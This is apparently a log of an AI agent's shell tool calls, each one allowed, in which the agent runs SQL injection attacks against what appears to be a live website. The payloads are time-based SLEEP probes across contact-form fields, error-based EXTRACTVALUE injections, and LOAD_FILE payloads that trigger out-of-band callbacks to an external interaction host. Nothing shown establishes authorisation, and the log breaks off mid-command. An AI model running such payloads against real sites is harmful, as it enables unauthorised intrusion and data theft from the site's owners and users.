{"ts": 1790751338.9440777, "decision_id": "d96d97610e61", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work/w15 && python3 -c \"\nimport h,time\n# time-based blind sqli on each field (no differential in size, so use tt)\ntests=[\n ('fname', \\\"QA' AND SLEEP(5)-- -\\\"),\n ('lname', \\\"Probe' AND SLEEP(5)-- -\\\"),\n ('cname', \\\"QA' AND SLEEP(5)-- -\\\"),\n ('subject', \\\"Sec' AND SLEEP(5)-- -\\\"),\n ('msg', \\\"body' AND SLEEP(5)-- -\\\"),\n ('areacode', \\\"973' AND SLEEP(5)-- -\\\"),\n ('tel', \\\"5551234' AND SLEEP(5)-- -\\\"),\n ('none', \\\"1' AND SLEEP(5)-- -\\\"),\n]\nfor f,v in tests:\n    h.post(h.base(**{f:v}), f'{f} SLEEP5'); time.sleep(4)\n\""}
{"ts": 1790751372.7398999, "decision_id": "821417e661d1", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && python3 - <<'EOF' 2>&1 | tee p15/sqli_oob.log\nimport requests,time\nUA=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36\"\nS=\"https://www.infinitycapital.bh\"\nh1=\"oobc875a1069850.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in\"\nh2=\"oobc4f7efa7d7e1.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in\"\ns=requests.Session(); s.headers.update({\"User-Agent\":UA})\ncases=[\n (\"/\",\"page\",\"2 AND (SELECT LOAD_FILE(CONCAT(0x2f,0x2f,LOAD_FILE(CONCAT(0x2f,0x2f,'x')))))\"),\n (\"/\",\"page\",f\"2 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1 FROM (SELECT 1 UNION SELECT 2)x)),'{h1}'))\"),\n (\"/\",\"page\",f\"2' AND (SELECT 1 FROM (SELECT 1 UNION SELECT 2,LOAD_FILE('{h1}/a'))x)-- \"),\n (\"/\",\"page\",f\"2; SELECT * FROM dual WHERE 1=(SELECT 1 FROM dual WHERE 1=LOAD_FILE('{h1}/b'))\"),\n (\"/\",\"page\",f\"2 AND (SELECT * FROM (SELECT(LOAD_FILE('{h1}/c'))a,2 b)x)\"),\n (\"/\",\"page\",\"2 AND IF(1=1,SLEEP(5),0)\"),\n (\"/\",\"page\",\"1 AND (SELECT 1 FROM (SELECT SLEEP(5))a)\"),\n (\"/contact\",\"cb\",f\"1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT LOAD_FILE('{h2}/d'))))\"),\n (\"/contact\",\"cb\",f\"1' AND EXTRACTVALUE(1,CONCAT(0x7e,LOAD_FILE('{h2}/e')))-- \"),\n (\"/contact\",\"cb\",f\"1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(LOAD_FILE('{h2}/f'),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)\"),\n (\"/contact\",\"cb\",\"1 AND SLEEP(5)\"),\n (\"/api/\",\"id\",f\"1' AND EXTRACTVALUE(1,CONCAT(0x7e,LOAD_FILE('{h1}/g')))-- \"),\n]\nfor p,par,v in cases:\n    u=S+p+\"?\"+par+\"=\"+requests.utils.quote(v,safe=\"\")\n    try:\n        t0=time.time(); r=s.get(u,timeout=30); dt=time.time()-t0\n        err = 'sql' in r.text.lower() and 'syntax' in r.text.lower()\n        print(f\"{p}?{par} {r.status_code} len={len(r.text)} dt={dt:.2f} sqli_err={err}  payload={v[:60]}\